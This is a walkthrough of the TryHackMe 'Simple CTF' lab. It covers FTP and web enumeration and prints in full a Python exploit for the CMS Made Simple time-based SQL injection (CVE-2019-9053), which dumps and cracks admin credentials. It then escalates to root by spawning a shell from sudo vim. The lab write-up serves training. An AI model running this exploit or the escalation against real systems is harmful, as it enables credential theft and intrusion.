
**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Linux  (Ubuntu)
**Category:** Web Exploitation / Privilege Escalation

## Objective

The objective of this room was to obtain two flags:

- `user.txt`
- `root.txt`

---

# 1. Reconnaissance & Enumeration

After confirming that the target was reachable, I started with service enumeration using Nmap.

`nmap -sC -sV -T4 -oN sctf.txt 10.48.165.55`

### Results

| Port     | Service | Version             |
| -------- | ------- | ------------------- |
| 21/tcp   | FTP     | vsftpd 3.0.3        |
| 80/tcp   | HTTP    | Apache httpd 2.4.18 |
| 2222/tcp | SSH     | OpenSSH 7.2p2       |

The scan showed two exposed services:

- **FTP (21)** — Anonymous FTP login allowed
- **HTTP (80)** — web application and primary attack surface 
-  **SSH (2222)** — It's changed from default port 

# 2. FTP Server Enumeration

First we will check `FTP` as it allow Anonymous login try to get any useful info.

```
ftp 10.48.165.55
```

```
Connected to 10.48.165.55.
220 (vsFTPd 3.0.3)
Name (10.48.165.55:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

After successful login I tried to list the content using `ls` cmd but firewall blocking it and gives this error
```
ftp> ls
229 Entering Extended Passive Mode (|||41461|)
```

So I searched online to bypass this it recommend to use `passive` cmd to switch this mode.

```
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
```

After that I get the `pub` directory then listing the content of this dir we get file name `ForMitch.txt` then downloaded the file on machine using `get` cmd.

```
root@ip-10-48-94-149:~/simple-ctf# cat ForMitch.txt
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

Tell that Mitch have set the same passwd for system user and i can cracked in seconds. It's helpful for us because we need get one can been used to get system user access.

# 3. Web Application Enumeration

As we know port `80` or http running, after `http://10.48.165.55` we only get `apache` default page so there's nothing to exploit. So i run directory enumeration using `gobuster` to check any web path.

So run following cmd:

```
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -u http://10.48.165.55
```

I got two path `/simple` and `/server-status` (is not worth to check), so the `/simple` get the web application which  powered by `CMS Made Simple` 

<a href="https://ibb.co/fYwQL6LT"><img src="https://i.ibb.co/XZRVM0MG/image.png" alt="image" border="0"></a>

After exploring the web page get the `CMS Made Simple` version which 2.2.8, so google the CVE for this version CMS and got `CVE-2019-9053` with Severity of `8.1 High`.

<a href="https://ibb.co/ZRr3QybY"><img src="https://i.ibb.co/CpyqjxSM/image.png" alt="image" border="0"></a>

After reading CVE get to know we can  use `SQL Injection` to exploit the application.


# 3. Exploition

So search for exploit we can use using `searchsploit` in local database.

```
root@ip-10-48-94-149:~/simple-ctf# searchsploit cms made simple 2.2.8
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection      | php/webapps/46635.py
---------------------------------------------- ---------------------------------
```

The is stored in following file path.  
	`/opt/exploitdb/exploits/php/webapps/46635.py`

So I copy this file into currect dir

Kindly use this file to avoid any error while running.

```46635.py
#!/usr/bin/env python3
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9 (Python 3 Fixed Syntax)
# Date: 30-03-2019 / Updated for Python 3
# Exploit Author: Daniele Scanu @ Certimeter Group
# CVE : CVE-2019-9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print("[+] Specify an url target")
    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist

def crack_password():
    global password
    global output
    global wordlist
    global salt
    try:
        with open(wordlist, 'r', encoding='utf-8', errors='ignore') as d:
            for line in d.readlines():
                line = line.replace("\n", "")
                beautify_print_try(line)
                # Python 3 requires encoding strings to bytes before md5 hashing
                hash_input = (str(salt) + line).encode('utf-8')
                if hashlib.md5(hash_input).hexdigest() == password:
                    output += "\n[+] Password cracked: " + line
                    break
    except FileNotFoundError:
        output += f"\n[-] Wordlist file not found: {wordlist}"

def beautify_print_try(value):
    global output
    print("\033c", end="")
    cprint(output,'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print("\033c", end="")
    cprint(output,'green', attrs=['bold'])

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print(colored("[*] Now try to crack password", "yellow"))
    crack_password()

beautify_print()
```

Then the  python script with
```
python3 46635.py -u http://10.48.165.55/simple --crack -w /usr/share/wordlists/rockyou.txt
```

after this get the credentials which can be used to login SSH shell of Mitch.

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: *******************
[+] Password cracked: ********
```
# 4. Initial Foothold

Let's login with creds to get SSH shell.

```
ssh -p 2222 mitch@10.48.165.55
```

- `-p 2222` - as we know ssh running on different port than default 22

```
Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
```

We get our first flag. Now, we need look for privilege escalation to get the `root` access.

# 5. Privilege Escalation

I used common method of privilege escalation like `sudo -l` 

```
$ sudo -l 
    (root) NOPASStype  :/usr/bin/vim
```

The user Mitch can run Vim with sudo privilege without password. Then i searched how can use to get root shell and found that using `-c` of vim we can run any cmd.

```
sudo /usr/bin/vim -c ':!/bin/bash'
```

And we are `root` , so get the root flag which most stored in root's home dir that is `/root` . 

```
root@Machine: ls /root
root.txt
```
And finally we get the our root flag and room completed.
